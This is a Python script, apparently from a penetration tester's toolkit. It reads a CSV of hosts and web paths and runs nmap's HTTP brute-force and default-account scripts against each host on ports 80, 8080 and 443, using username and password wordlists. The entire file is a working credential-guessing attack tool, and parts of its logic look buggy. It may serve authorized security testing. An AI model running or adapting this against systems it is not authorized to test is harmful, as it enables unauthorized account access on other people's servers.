#!/root/anaconda3/envs/pentest/bin/python

import nmap
import sys
import time
import sh
import pandas as pd
import re
import sys

#Read a csv into a dataframe
csv_path = sys.argv[1]
output_path = sys.argv[2]
# df = pd.read_csv('/root/pentests/hosts/http/http_auth_test.csv')
df = pd.read_csv(csv_path)

first_url = []
try:
    for item in df['Script']:
            urls = re.search("(?P<url>https?://[^\s]+)", item) # grabs entire URL, need to improve but plan is to shoot all nmap script auth brute types
            first_match = str(urls[0])
            first_url.append(urls[0])

except Exception as e:
    print(e)
    first_url.append("N/A")
    
df['URL0'] = first_url

#GET PATHS COLUMN ADDED
url_paths = []
try:
    for item in df['Script']:
            urls = re.search("(?P<url>https?://[^\s]+)", item) # full URLs but needs to be changed to specify FORM/BASIC auth types
            first_match = str(urls[0]) # gets the first URI
            paths = re.search("(https?:\/\/(.+?)(\/.*))", first_match)
            print(paths[3])
            url_paths.append(paths[3])
except:
    url_paths.append("N/A")

#put list in column in df
df['Path'] = url_paths

# CREATING FUNCTIONS
def http_brute(ipaddress,path,userdb=None,passdb=None):
    if userdb == None:
        userdb = '/usr/share/nmap/nselib/data/usernames.lst' #pass the default lists if none is supplied
    if passdb == None:
        passdb = '/usr/share/nmap/nselib/data/passwords.lst' #default passwords list
    scanner = nmap.PortScanner()
    targets = []
    #ftp-brute will attempt a guess for every password in the passdb list for each username
    #userdb/passdb is used to supply my own password list or the default will be used 
    #brute.emptypass=True will attempt empty passwords
    #username as passwords guessing is on by default. Supply an empty passdb list and only this will be executed
    scan1 = scanner.scan(hosts=ipaddress, arguments=f'''
        --script "http-brute,http-form-brute,http-default-accounts"
        --script-args=userdb={userdb},passdb={passdb},brute.emptypass=True,unpwdb.timelimit=0,http-brute.path={path},http-form-brute.path={path},http-default-accounts.basepath={path}
        -d -v -T2 -p 80,8080,443
        ''')#scan for ftp vulns using the scripts and attach associated arguments for them as needed
    xml = scanner.get_nmap_last_output()    #GET XML OUTPUT
    try:
        df1 = pd.DataFrame(scan1)
        a = scanner.command_line()
        b = scanner.scaninfo()
        c = scanner.scanstats()
        d = scanner.all_hosts() #gets ip address
        s = scan1['scan']

        f = [d[0],a,b,c,s] #Add any values and then add a column name for it inside the columns 
        df2 = pd.DataFrame([f], columns=['IP','cmdLine','scaninfo','scanStats','scanData']) #make df of the d list holding the ip address to append to my df
    #EXTRACT THE SCANDATA FIELDS AND PRINT IT
        cmdline = df2['cmdLine'][0]
        scaninfo = df2['scaninfo'][0]
        hostnames = df2['scanData'][0][d[0]]['hostnames']
        addresses = df2['scanData'][0][d[0]]['addresses']
        vendor = df2['scanData'][0][d[0]]['vendor']
        status = df2['scanData'][0][d[0]]['status']
        print("Elapsed Time:",df2['scanStats'][0]['elapsed']) #You can still pull keys out from the stored DF data even!
        print(f"IP/MAC: {addresses}")
        print(f"status: {status}")
        print(f"vendor: {vendor}")
        print(f"Hostnames: {hostnames}")
        print(f"{d}")
        print(f"command: {cmdline}\nscaninfo: {scaninfo}")
        return df1,df2,xml #returning three variables in form of a tuple 
    except Exception as e:
        print(e)
        
def http_vuln_data(df):
#CHECK FTP SCAN DATA(must run after scan)
    import pprint
    pp = pprint.PrettyPrinter(indent=1)
    ip = df['IP'][0] #pulls the ip used in the scan
    a = df['scanData'][0][ip]["tcp"][80] #just prints port 80 but have a look at the csv for all script/port details
    print('\n')
    pp.pprint(a)
    
def get_script_output(df2):
    try:
        a = df2['scanData'][0][ipaddress]["tcp"][80]['script'] #make sure the "ipaddress" stays the same when putting it into the main http_brute function so when it passes it picks up the script properties properly
    except Exception as e:
        print(e)
        a = "80 is N/A"
    try:
        b = df2['scanData'][0][ipaddress]["tcp"][8080]['script']
    except Exception as e:
        print()
        b = "8080 is N/A"
    try:
        c = df2['scanData'][0][ipaddress]["tcp"][443]['script']
    except Exception as e:
        print(e)
        c = "443 is N/A"
    d = f'{str(a)} {str(b)} {str(c)}'
    print(d,"\n")
    return(d)

#Brute all hosts were identified with port 80,8080,443 being open
userdb=None #must be specified
passdb = '/root/pentests/hosts/http/pass3.txt' #custom pass list
# passdb = None #will use default list of 5000 common passwords
script_details = []
for ipaddress,path in zip(df['IPv4'],df['Path']):
    try:
        print(f'Brute Forcing {ipaddress}{path} with {passdb}')
        df1,df2,xml = http_brute(ipaddress,path,userdb,passdb)
        print(f'{http_vuln_data(df2)}\n')
        d = get_script_output(df2)
    except Exception as e:
        print(f"failed due to: {e}")
        d = "Script failure occurred"
        pass
    script_details.append(d)
    #Write A log of each attempt in case i end the script early and don't write to csv
    with open('/root/pentests/hosts/http/bruteLog.txt', 'a+') as file:
        file.write(f'{ipaddress},{d}\n')
#APPEND COLUMN OF BRUTE DETAILS TO CSV
df['Brute_Results'] = script_details

print(f"Results are being written to {output_path}")
df.to_csv(output_path)
